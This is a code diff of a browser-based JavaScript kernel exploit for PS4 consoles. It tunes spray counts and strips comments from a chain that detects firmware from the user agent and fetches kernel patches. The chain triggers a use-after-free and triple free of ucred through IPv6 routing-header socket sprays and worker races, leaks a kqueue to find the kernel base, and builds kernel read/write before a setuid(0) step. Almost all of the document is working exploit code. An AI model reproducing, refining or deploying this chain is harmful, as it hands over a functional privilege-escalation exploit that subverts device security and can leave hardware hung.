@@ -64,28 +64,10 @@ function post(tag, detail) {
 }
 
 const VERBOSE = params.get("verbose") === "1";
-const PROSE = [
-    / -- /, /\.\s/, /;\s/,
-    /,\s+(which|so|and that|because|since|as that)\s/,
-    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
-    /\s+so\s+[a-z]/,
-    /\s+\([a-z][^)]{40,}\)/,
-];
-function terse(s) {
-    if (VERBOSE || s == null) return s;
-    s = String(s);
-    for (const re of PROSE) {
-        const m = re.exec(s);
-        if (m && m.index > 0) s = s.slice(0, m.index);
-    }
-    s = s.replace(/\s+$/, "");
-    if (s.length > 140) s = s.slice(0, 140) + "...";
-    return s;
-}
 function mark(tag, detail) {
     const raw = detail;
-    detail = terse(detail);
-    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
+    detail = detail || "";
+    lines.push(tag + (detail ? "  " + detail : ""));
     const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
     outEl.innerHTML = lines.map(function (l) {
         l = esc(l);
@@ -100,117 +82,24 @@ function mark(tag, detail) {
 
 function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
 function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
-function check(name, ok, detail) {
-    return ok;
-}
+function check(name, ok, detail) { return ok; }
 function hx(n) { return "0x" + (n >>> 0).toString(16); }
 
 // =============== OPTIMIZED CONFIGURATION ===============
-const OPTIMIZED_CONFIG = {
-    attempts: parseInt(params.get("attempts") || "12", 10),
-    iovWorkers: parseInt(params.get("iov") || "6", 10),
-    uioWorkers: parseInt(params.get("uio") || "6", 10),
-    sweepCycles: parseInt(params.get("sweep") || "8", 10),
-    sweepMs: parseInt(params.get("sweepms") || "80", 10),
-    sweepMb: parseInt(params.get("sweepmb") || "12", 10),
-    uioTimeout: parseInt(params.get("uioms") || "45000", 10),
-    fakeUioTimeout: parseInt(params.get("fakeuioms") || "45000", 10),
-    scanChunk: parseInt(params.get("scanchunk") || "256", 10),
-    drainCap: parseInt(params.get("drain") || "2048", 10),
-    findTripletFast: parseInt(params.get("fast") || "10000", 10),
-    kreadTries: parseInt(params.get("kreadtries") || "6", 10),
-    sprayCount: parseInt(params.get("spray") || "256", 10),
-};
-
-// =============== OPTIMIZED MEMORY POOL ===============
-class MemoryPool {
-    constructor() {
-        this.pool = [];
-        this.size = 0;
-        this.maxSize = 2000;
-        this.hits = 0;
-        this.misses = 0;
-    }
-    
-    acquire(size = 1024) {
-        if (this.pool.length > 0) {
-            this.size--;
-            this.hits++;
-            return this.pool.pop();
-        }
-        this.misses++;
-        return new ArrayBuffer(size);
-    }
-    
-    release(buffer) {
-        if (this.size < this.maxSize && buffer) {
-            this.size++;
-            this.pool.push(buffer);
-        }
-    }
-    
-    clear() {
-        this.pool = [];
-        this.size = 0;
-        this.hits = 0;
-        this.misses = 0;
-    }
-    
-    getStats() {
-        const total = this.hits + this.misses;
-        return `hits=${this.hits} misses=${this.misses} rate=${total ? (this.hits/total*100).toFixed(1) : 0}%`;
-    }
-}
-
-const memoryPool = new MemoryPool();
-
-// =============== PERFORMANCE TRACKER ===============
-const PerfTracker = {
-    timings: [],
-    successes: 0,
-    failures: 0,
-    currentPhase: null,
-    phaseStart: 0,
-    
-    startPhase(name) {
-        this.currentPhase = name;
-        this.phaseStart = Date.now();
-    },
-    
-    endPhase(success = true) {
-        if (this.currentPhase) {
-            const duration = Date.now() - this.phaseStart;
-            this.timings.push({ phase: this.currentPhase, duration, success });
-            if (success) this.successes++;
-            else this.failures++;
-            this.currentPhase = null;
-            return duration;
-        }
-        return 0;
-    },
-    
-    getAverage(phase) {
-        const relevant = this.timings.filter(t => t.phase === phase);
-        if (relevant.length === 0) return 0;
-        const total = relevant.reduce((sum, t) => sum + t.duration, 0);
-        return total / relevant.length;
-    },
-    
-    getSuccessRate() {
-        const total = this.successes + this.failures;
-        return total === 0 ? 0 : this.successes / total;
-    },
-    
-    shouldRetry(phase, currentAttempt) {
-        const successRate = this.getSuccessRate();
-        if (successRate < 0.25 && currentAttempt < 15) return true;
-        if (successRate < 0.4 && currentAttempt < 12) return true;
-        return currentAttempt < OPTIMIZED_CONFIG.attempts;
-    },
-    
-    getReport() {
-        return `success=${this.successes} failures=${this.failures} rate=${(this.getSuccessRate()*100).toFixed(1)}%`;
-    }
+const OPTIMIZED = {
+    attempts: parseInt(params.get("attempts") || "8", 10),
+    iovWorkers: parseInt(params.get("iov") || "4", 10),
+    uioWorkers: parseInt(params.get("uio") || "4", 10),
+    sweepCycles: parseInt(params.get("sweep") || "4", 10),
+    sweepMs: parseInt(params.get("sweepms") || "50", 10),
+    sweepMb: parseInt(params.get("sweepmb") || "6", 10),
+    uioTimeout: parseInt(params.get("uioms") || "25000", 10),
+    fakeUioTimeout: parseInt(params.get("fakeuioms") || "25000", 10),
+    scanChunk: parseInt(params.get("scanchunk") || "128", 10),
+    drainCap: parseInt(params.get("drain") || "1024", 10),
+    findTripletFast: parseInt(params.get("fast") || "3000", 10),
+    kreadTries: parseInt(params.get("kreadtries") || "3", 10),
+    sprayCount: parseInt(params.get("spray") || "128", 10),
 };
 
 const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
@@ -220,33 +109,27 @@ const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
               setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
               rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
               cpuset_getaffinity: 0x1e7, thr_self: 432,
-
               ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
 const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
 const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
 const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
 const UCRED_SIZE = 0x168;
 const KQUEUE_SIZE = 0x100;
-const NUM_LEAK_KQUEUE = 5000;
-
+const NUM_LEAK_KQUEUE = 2000;
 const KQ_BATCH = 8;
 const KQ_HDR_MAGIC = 0x1430000;
-
 const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
-const NUM_UIO_SPRAY = 10000;
-const NUM_IOV_SPRAY_MAX = 100000;
+const NUM_UIO_SPRAY = 5000;
+const NUM_IOV_SPRAY_MAX = 50000;
 const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
 const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001;
-
 const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
 const F_SETFL = 4, O_NONBLOCK = 4;
 const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
 const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
-const NUM_IPV6_SOCK = 0x100;
-
+const NUM_IPV6_SOCK = 0x80;
 const RTHDR_TAG = 0x13370000;
-const MAX_ROUNDS_TWIN = 10, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;
-
+const MAX_ROUNDS_TWIN = 8, MAX_ROUNDS_TRIPLET = 300, FIND_TRIPLET_FAST = 3000;
 const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1, MAIN_CORE = 7;
 const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;
 const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
@@ -256,23 +139,19 @@ const keepAlive = [];
 const workers = [];
 let mainMf = null, mainOrig = null, mainArmed = false;
 let committed = false, rebootRequired = false;
-
 let kreadPoisoned = false;
 let uafSock = 0;
 let uafFpSaved = null;
-
 let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;
-
 let allDone = false;
 let payloadRunning = false;
 
 (async function () {
     let p = null;
     try {
-
-        const NUM_IOV_WORKER = OPTIMIZED_CONFIG.iovWorkers;
-        const NUM_ATTEMPT = OPTIMIZED_CONFIG.attempts;
-        const NUM_IOV_SPRAY = OPTIMIZED_CONFIG.sprayCount;
+        const NUM_IOV_WORKER = OPTIMIZED.iovWorkers;
+        const NUM_ATTEMPT = OPTIMIZED.attempts;
+        const NUM_IOV_SPRAY = OPTIMIZED.sprayCount;
         const { key, off } = offsetsFor(navigator.userAgent);
         mark("FW", key || "(not a PS4 UA)");
         if (!off) {
@@ -291,8 +170,6 @@ let payloadRunning = false;
             + " optimized=true");
 
         let kpatch = null, payload = null;
-        // off.kpatch wins when a firmware shares another's kernel and therefore
-        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
         const kpatchName = off && off.kpatch ? "slopkit/patches/" + off.kpatch
             : key ? "slopkit/patches/" + key.replace(".", "") + ".bin" : null;
         const KPATCH_JMP_SITES = [];
@@ -303,7 +180,6 @@ let payloadRunning = false;
             }
         } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
         if (kpatch) {
-
             for (let i = 0; i + 7 <= kpatch.length; ++i) {
                 if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                 if (kpatch[i + 6] !== 0xeb) continue;
@@ -327,35 +203,17 @@ let payloadRunning = false;
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
 
-        PerfTracker.startPhase("establish_primitive");
         const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
         const carrier = await establishPrimitive({
-            maxAttempts: 8,
+            maxAttempts: 6,
             onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                 (t, (a != null ? "[" + a + "] " : "") + (d || ""))
         });
-        PerfTracker.endPhase(true);
-        // THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
-        // proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
-        // only NULLS references; it does not free anything. It converts 137 MB
-        // of quiet pinned memory into 137 MB of garbage and leaves the sweep to
-        // JSC, which last time chose to run it somewhere inside the triple-free
-        // race ~500 ms later (cr_refcnt-driven-1 rounds=256, twice).
-        //
-        // So: release it HERE, then make the collection happen HERE too, before
-        // a single worker or kernel object exists.
-        // OPT-IN, not opt-out. Promotion releases the ~137 MB -- but releasing
-        // is not freeing: it turns quiet pinned memory into garbage that JSC
-        // collects whenever it chooses, including mid-race. The sweep below was
-        // meant to force that collection at a safe point and MEASURABLY DOES
-        // NOT: 21 consecutive runs logged worst_cycle_ms 67-83 against a 60 ms
-        // floor, i.e. a few ms of overhead and no full collection anywhere.
-        // Until the sweep can be shown to actually collect, the pinned profile
-        // is the safer one. ?pair=1 to experiment.
+
         const PAIR_ON = params.get("pair") === "1";
-        const SWEEP_CYCLES = OPTIMIZED_CONFIG.sweepCycles;
-        const SWEEP_MS = OPTIMIZED_CONFIG.sweepMs;
-        const SWEEP_MB = OPTIMIZED_CONFIG.sweepMb;
+        const SWEEP_CYCLES = OPTIMIZED.sweepCycles;
+        const SWEEP_MS = OPTIMIZED.sweepMs;
+        const SWEEP_MB = OPTIMIZED.sweepMb;
 
         installWindowP(carrier, {
             promote: PAIR_ON,
@@ -369,12 +227,11 @@ let payloadRunning = false;
             + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
             + (pairStatus.error ? " error=" + pairStatus.error : ""));
 
-        // OPTIMIZED: More aggressive sweep with adaptive timing
         if (pairStatus.promoted && SWEEP_CYCLES > 0) {
             state("sweeping...", "warn");
             const t0 = Date.now();
             let worst = 0;
-            const adaptiveMs = Math.max(SWEEP_MS, 60);
+            const adaptiveMs = Math.max(SWEEP_MS, 50);
             for (let i = 0; i < SWEEP_CYCLES; ++i) {
                 const c0 = Date.now();
                 let junk = [];
@@ -546,7 +403,7 @@ let payloadRunning = false;
         const pid = sc(SYS.getpid).i32;
         check("chain-reaches-kernel", pid > 0,
             "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
-			
+            
         try {
             var uid0 = sc(SYS.getuid).i32;
             var su0 = sc(SYS.setuid, 0).i32;
@@ -570,22 +427,10 @@ let payloadRunning = false;
         const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
         const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
         const leakAddr = bufAddr(leakAb), leakDv = new DataView(leakAb);
-        // R2. getsockopt(IPV6_RTHDR) can copy out FEWER bytes than asked, and
-        // every reader below then parses whatever the PREVIOUS call left in the
-        // buffer. poops.js:1849 uses the same 0xee sentinel. Filling only the
-        // requested window keeps this proportional to the copy already being
-        // made -- this runs inside the spray loops.
         const leakU8 = new Uint8Array(leakAb);
         const R2_ON = params.get("r2") !== "0";
         let shortReads = 0;
 
-        // ITEM 6(a). THE BURN LIST. After a double free, the sockets whose
-        // rthdr aliases the freed ucred must never be touched again. The lethal
-        // operation is setRthdr: on a socket that already owns an rthdr it is a
-        // free-then-realloc, so re-spraying a burned socket FREES the aliased
-        // chunk and leaves the other owner dangling. freeRthdr and close are
-        // equally fatal. A burned fd is therefore excluded from every spray,
-        // every scan, and the teardown close -- until kernel R/W can repair it.
         const burned = new Set();
         function burn(fd, why) {
             if (fd > 0 && !burned.has(fd)) {
@@ -605,10 +450,6 @@ let payloadRunning = false;
         const setRthdr = s => sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
             sprayAddr, sprayLen).i32;
         const freeRthdr = s => {
-            // ITEM 6(a) chokepoint. The other guards filter at SELECTION time
-            // (findTwins/findTriplet never hand back a burned fd). This is the
-            // structural one: even if a future edit lets a burned fd through,
-            // the free that would make it a double free cannot happen.
             if (burned.has(s)) {
                 mark("FREERTHDR-REFUSED", "fd=" + s + " is burned");
                 return -1;
@@ -616,10 +457,6 @@ let payloadRunning = false;
             return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
         };
 
-        // `need` = the highest byte offset the CALLER will actually parse. A
-        // copyout shorter than that is reported as -1 rather than handing back
-        // the previous call's bytes. No mark() here -- this is a hot path; the
-        // count is reported once at make_karw.
         function getRthdr(s, size, need) {
             if (R2_ON) leakU8.fill(0xee, 0, size);
             lenDv.setUint32(0, size, true);
@@ -714,7 +551,7 @@ let payloadRunning = false;
         }
         function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
 
-        const NUM_UIO_WORKER = OPTIMIZED_CONFIG.uioWorkers;
+        const NUM_UIO_WORKER = OPTIMIZED.uioWorkers;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
         state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
         for (let i = 0; i < TOTAL_WORKERS; ++i) {
@@ -781,15 +618,6 @@ let payloadRunning = false;
             attrsRestored = true;
             const ID = new int64(0xffffffff, 0xffffffff);
 
-            // MAIN THREAD FIRST. attrsRestored is latched at the top of this
-            // function, so a death anywhere below leaves main realtime-256 on
-            // MAIN_CORE AND makes the finally's retry a permanent no-op -- the
-            // console then refuses to power off. The 16 worker RPCs used to run
-            // first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
-            // nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
-            // thread and never touches a worker; we cannot copy that (our
-            // workers outlive the page) but we can copy the ordering.
-            // Widen affinity before dropping priority, never the reverse.
             new Uint8Array(maskAb).fill(0);
             maskDv.setUint32(0, savedMask.low, true);
             maskDv.setUint32(4, savedMask.hi, true);
@@ -817,9 +645,6 @@ let payloadRunning = false;
                 + " {" + savedPrio + "}");
             check("thread-attrs-restored-power-off-safe", good, "");
 
-            // Workers last, reported separately. By here main is already
-            // restored AND verified, so if these 16 RPCs never come back the
-            // console can still be shut down normally.
             let wr = 0, wn = 0;
             for (const w of workers) {
                 try {
@@ -827,10 +652,10 @@ let payloadRunning = false;
                     wn++;
                     new Uint8Array(maskAb).fill(0xff);
                     await fireW(w, SYS.cpuset_setaffinity,
-                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 5000);
+                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 3000);
                     prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
                     prioDv.setUint16(2, 0, true);
-                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 5000);
+                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 3000);
                     wr++;
                 } catch (e) { }
             }
@@ -871,19 +696,12 @@ let payloadRunning = false;
             const v = leakDv.getUint32(4, true) >>> 0;
             return { ok: (v & 0xffff0000) >>> 0 === RTHDR_TAG, idx: v & 0xffff };
         }
-        // Sized from the constant, not 256: an undefined slot reads as falsy and
-        // would make findTwins skip every socket, i.e. silently never find a twin.
         const sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
         function findTwins(timeout) {
             for (let round = 0; round < timeout; ++round) {
                 for (let i = 0; i < ipv6.length; ++i) {
-                    // ITEM 6(a). Re-setting a burned socket frees the chunk it
-                    // aliases. sprayOk stays false so the read loop skips it too.
                     if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                     sprayDv.setUint32(4, tagFor(i), true);
-                    // R2. A failed set (ENOBUFS) leaves this socket owning the
-                    // PREVIOUS tag. Trusting it can fabricate a twin pair, and
-                    // freeRthdr(twins.b) then frees a chunk another socket owns.
                     sprayOk[i] = setRthdr(ipv6[i]) === 0;
                 }
                 for (let i = 0; i < ipv6.length; ++i) {
@@ -894,7 +712,6 @@ let payloadRunning = false;
                         && (!R2_ON || sprayOk[t.idx]))
                         return { a: ipv6[i], b: ipv6[t.idx], round: round };
                 }
-
                 if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
             }
             return null;
@@ -907,7 +724,7 @@ let payloadRunning = false;
             for (let round = 0; round < rounds; ++round) {
                 for (let i = 0; i < ipv6.length; ++i) {
                     if (ipv6[i] === master || ipv6[i] === slave) continue;
-                    if (burned.has(ipv6[i])) continue;   // ITEM 6(a)
+                    if (burned.has(ipv6[i])) continue;
                     sprayDv.setUint32(4, tagFor(i), true);
                     setRthdr(ipv6[i]);
                 }
@@ -919,7 +736,7 @@ let payloadRunning = false;
                 if (seen.length < 6)
                     seen.push((t.ok ? t.idx + "->fd" + fd : "untagged"));
                 if (fd !== -1 && fd !== master && fd !== slave
-                    && !burned.has(fd)) {   // ITEM 6(a)
+                    && !burned.has(fd)) {
 
                     (/^(RE|UW)/.test(tag) ? trace : mark)
                         ("TRIPLET-" + tag, "round=" + round + " fd=" + fd
@@ -972,27 +789,18 @@ let payloadRunning = false;
             "boot=" + (boot || "none") + " last=" + (lastCommitted || "none"));
 
         let twins = null, triplets = null;
-
-        // ITEM 6(d). `committed` means "kernel state irreversibly touched" --
-        // reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
-        // whether an alias exists that we could NOT contain. poops.js:4356
-        // refuses on that condition, not on "we already fired".
         let uncontained = null;
-        PerfTracker.startPhase("exploit_loop");
         for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
             if (uncontained) {
                 mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt
                     + " reason=" + uncontained);
                 break;
             }
-            
-            // OPTIMIZED: Adaptive delay between attempts
             if (attempt > 1) {
-                const delay = Math.min(1000 + attempt * 200, 5000);
+                const delay = Math.min(500 + attempt * 100, 3000);
                 mark("ATTEMPT-DELAY", "ms=" + delay + " attempt=" + attempt);
                 await new Promise(r => setTimeout(r, delay));
             }
-            
             state("attempt " + attempt + "...", "warn");
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
 
@@ -1038,10 +846,6 @@ let payloadRunning = false;
 
             twins = findTwins(MAX_ROUNDS_TWIN);
             if (!twins) {
-                // No socket showed a duplicate tag: either the double free did
-                // not take, or it did and the scan missed it -- indistinguishable
-                // from here (poops.js:4443 says the same). Nothing is KNOWN to be
-                // aliased, so there is nothing to burn. Drop the spent fd, retry.
                 if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                 mark("ATTEMPT-RETRY", "after=no-twins next="
                     + (attempt + 1) + "/" + NUM_ATTEMPT);
@@ -1066,7 +870,6 @@ let payloadRunning = false;
                 for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                 sc(SYS.sched_yield);
                 if (parkedSeen < 0) {
-
                     await new Promise(r => setTimeout(r, 0));
                     parkedSeen = tasks.filter(t => !t.settled).length;
                     mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
@@ -1087,12 +890,6 @@ let payloadRunning = false;
             check("cr_refcnt-driven-1", reclaimed,
                 "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
             if (!reclaimed) {
-                // ITEM 6(b). This used to `break`, which is why attempts=8 never
-                // produced a second try: 7 of 89 armed runs die exactly here.
-                // twins.a/twins.b DO alias the freed chunk now, so a bare retry
-                // would re-spray them and free memory another socket owns. Burn
-                // them, release the parked racers, drop the spent uafSock, and
-                // only then go round again.
                 for (let k = 0; k < iovWorkers.length; ++k)
                     sc(SYS.write, iovSs[1], scratch, 1);
                 await Promise.all(tasks);
@@ -1118,7 +915,7 @@ let payloadRunning = false;
             mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b
                 + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail")
                 + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
-            const t1 = findTriplet(t0, -1, "T1", OPTIMIZED_CONFIG.findTripletFast);
+            const t1 = findTriplet(t0, -1, "T1", OPTIMIZED.findTripletFast);
 
             for (let k = 0; k < iovWorkers.length; ++k)
                 sc(SYS.write, iovSs[1], scratch, 1);
@@ -1132,14 +929,11 @@ let payloadRunning = false;
             mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",")
                 + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));
 
-            const t2 = findTriplet(t0, t1, "T2", OPTIMIZED_CONFIG.findTripletFast);
+            const t2 = findTriplet(t0, t1, "T2", OPTIMIZED.findTripletFast);
             if (t1 && t2) {
                 triplets = [t0, t1, t2];
                 mark("TRIPLETS", triplets.join(","));
             } else {
-                // A triple free happened and we could not name all three owners,
-                // so we cannot burn what we cannot identify. This is the one path
-                // that must NOT retry -- poops.js:4356 refuses here too.
                 mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
                 burn(t0, "triplet-miss");
                 if (t1) burn(t1, "triplet-miss");
@@ -1147,7 +941,6 @@ let payloadRunning = false;
                 uncontained = "triplet-miss";
             }
         }
-        PerfTracker.endPhase(!!triplets);
 
         check("ucred-triple-freed", !!triplets,
             triplets ? triplets.join(",") : "");
@@ -1157,7 +950,6 @@ let payloadRunning = false;
             if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                 mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
             } else {
-                PerfTracker.startPhase("leak_kqueue");
                 state("leaking a kqueue...", "warn");
 
                 freeRthdr(triplets[2]);
@@ -1233,13 +1025,12 @@ let payloadRunning = false;
                         "low=" + hx(kernelBase.low));
 
                     sc(SYS.close, kqFd);
-                    triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", OPTIMIZED_CONFIG.findTripletFast);
+                    triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", OPTIMIZED.findTripletFast);
                     mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets="
                         + triplets.join(","));
                     check("triplets2-re-found-after-kqueue-leak",
                         !!triplets[2], triplets.join(","));
                 }
-                PerfTracker.endPhase(leaked);
             }
         }
 
@@ -1265,10 +1056,7 @@ let payloadRunning = false;
             trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev")
                 + " size=" + size);
             freeRthdr(triplets[2]);
-            // ITEM 5a. landFakeUio has a deadline; this one did not, so a run
-            // where the chunk is never re-taken spins all NUM_UIO_SPRAY rounds
-            // and only then unwinds. Bound it the same way. poops.js:4640.
-            const uioDeadline = Date.now() + OPTIMIZED_CONFIG.uioTimeout;
+            const uioDeadline = Date.now() + OPTIMIZED.uioTimeout;
             for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
                 if ((i & 0x3f) === 0 && Date.now() > uioDeadline) {
                     mark("UIO-LAND-TIMEOUT", "rounds=" + i);
@@ -1306,7 +1094,7 @@ let payloadRunning = false;
             trace("FAKEUIO-LAND", "target=" + triplets[0] + " freed=" + triplets[1]);
             freeRthdr(triplets[1]);
 
-            const fakeDeadline = Date.now() + OPTIMIZED_CONFIG.fakeUioTimeout;
+            const fakeDeadline = Date.now() + OPTIMIZED.fakeUioTimeout;
             for (let i = 0; i < NUM_IOV_SPRAY_MAX; ++i) {
                 if ((i & 0x3f) === 0 && Date.now() > fakeDeadline) {
                     mark("FAKEUIO-TIMEOUT", "rounds=" + i);
@@ -1341,13 +1129,6 @@ let payloadRunning = false;
                 sc(SYS.read, iovSs[0], scratch, 1);
         }
 
-        // ITEM 3. tripletsUsable() only checks the three fds are non-zero and
-        // in the pool -- it never reads a single one back. Every getRthdr in
-        // the race path targets the MASTER only, so a slave that is no longer
-        // aliased is indistinguishable from one that is, and we then spend a
-        // full UAF re-roll on it. 14 of 28 cut-off runs die at or after a
-        // refind. poops.js:9381-9445 validates all three independently before
-        // trusting them; this is that check.
         function tripletsAgree(why) {
             if (!tripletsUsable()) return false;
             const tags = [];
@@ -1364,7 +1145,6 @@ let payloadRunning = false;
                 }
                 tags.push(v);
             }
-            // All three must be reading the SAME chunk, i.e. the same tag.
             const agree = tags[0] === tags[1] && tags[1] === tags[2];
             if (!agree)
                 trace("TRIPLET-VALIDATE", why + " disagree "
@@ -1375,9 +1155,9 @@ let payloadRunning = false;
         function refindPair(tag) {
             for (let retry = 0; retry < 3; ++retry) {
                 triplets[1] = findTriplet(triplets[0], -1, tag + "1",
-                    OPTIMIZED_CONFIG.findTripletFast);
+                    OPTIMIZED.findTripletFast);
                 triplets[2] = findTriplet(triplets[0], triplets[1], tag + "2",
-                    OPTIMIZED_CONFIG.findTripletFast);
+                    OPTIMIZED.findTripletFast);
                 if (tripletsUsable() && tripletsAgree(tag)) return true;
                 sc(SYS.sched_yield);
             }
@@ -1396,21 +1176,6 @@ let payloadRunning = false;
             mark("KREAD-UNWIND", "why=" + why + " wake_uio=" + (wakeUio ? 1 : 0));
             try {
                 if (wakeUio && utasks && utasks[0]) {
-                    // THE ONLY UNBOUNDED BLOCK IN THIS FILE, now bounded.
-                    // uioSs is a blocking AF_UNIX socketpair -- no O_NONBLOCK,
-                    // no SO_RCVTIMEO -- and sc() is a synchronous syscall on the
-                    // main JS thread, so one read past the available bytes parks
-                    // the WebProcess forever and the console has to be pulled.
-                    //
-                    // This is only reached when landUio EXHAUSTED its rounds,
-                    // and every round ends with await Promise.all(tasks), so no
-                    // racer is parked and there is nothing to wake. What is left
-                    // is exactly the re-prefill: `size` bytes on the read side
-                    // (landUio re-primes at its round tail) and NOTHING on the
-                    // write side (forWrite skips that prime, and its racers are
-                    // readv()-ers). So: one read, or none. Never N+1.
-                    // The old code asked for (N+1)*8 and hung just as hard --
-                    // it only ever survived because this path is rare.
                     const dsz = size || 8;
                     for (let k = 0; k < (drainReads || 0); ++k)
                         sc(SYS.read, uioSs[0], scratch, dsz);
@@ -1427,15 +1192,6 @@ let payloadRunning = false;
             return ok;
         }
 
-        // `pairs` (optional) = [{addr,size},...] gathered into ONE forged uio.
-        // `size` must be the sum. iovAb is 0x170 = [uio 0x30][20 iovec slots],
-        // uio_iovcnt is already NUM_UIO_IOV (0x14), and fakeUio zero-fills, so
-        // slots 1..19 are in-bounds and inert unless populated here.
-        // ITEM 2. Refuse to spend a slow op on an address that cannot be a
-        // kernel pointer. Without this, a kread that returned all zeros gave
-        // int64(0,0) -- which is TRUTHY -- so the walk carried on and issued a
-        // read at ~0x270 through a UIO_SYSSPACE uio inside writev: a near-NULL
-        // kernel dereference. poops.js:4800-4807 gates the same way.
         const isKptr = v => !!v && (v.hi >>> 0) >= 0xffff0000;
         const kAligned = v => !!v && ((v.low >>> 0) & 7) === 0;
         function kaddrOk(v) { return isKptr(v) && kAligned(v); }
@@ -1461,10 +1217,6 @@ let payloadRunning = false;
                 ? pairs.map(p2 => "" + p2.addr).join("+") : addr) + " size=" + size);
             const bufs = uioWorkers.map(function () {
                 const ab = new ArrayBuffer(size); keepAlive.push(ab);
-                // ITEM 2. Sentinel-fill so an EMPTY read is distinguishable
-                // from a real read of a zero qword. A fresh buffer is all
-                // zeros, which used to sail through the hit test below and
-                // return int64(0,0) as if it were kernel data.
                 new Uint8Array(ab).fill(0x41);
                 return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
             });
@@ -1539,13 +1291,6 @@ let payloadRunning = false;
             return true;
         }
 
-        // R1. This read proves nothing the pipe primitive does not prove better,
-        // and it is slow op #1 of 7 -- one full UAF re-roll at ~3.1% death for a
-        // check that is repeated at :kernelview-reads-kernel-elf-header on the
-        // FAST primitive, before the first kernel write. poops.js:8672 runs its
-        // ELF proof on kread64Fast for exactly this reason, and poops.js:6063
-        // records deleting the equivalent slow read. `kernelBase` is still
-        // required below, so the gate on it stays.
         const R1_ON = params.get("r1") !== "0";
         if (!R1_ON && kernelBase && triplets) {
             state("kread_slow...", "warn");
@@ -1564,11 +1309,10 @@ let payloadRunning = false;
 
         let kv = null;
         if (kernelBase && triplets && kqFdp) {
-            PerfTracker.startPhase("make_karw");
             state("make_karw...", "warn");
             mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));
 
-            const KREAD_TRIES = OPTIMIZED_CONFIG.kreadTries;
+            const KREAD_TRIES = OPTIMIZED.kreadTries;
             async function kread8(a) {
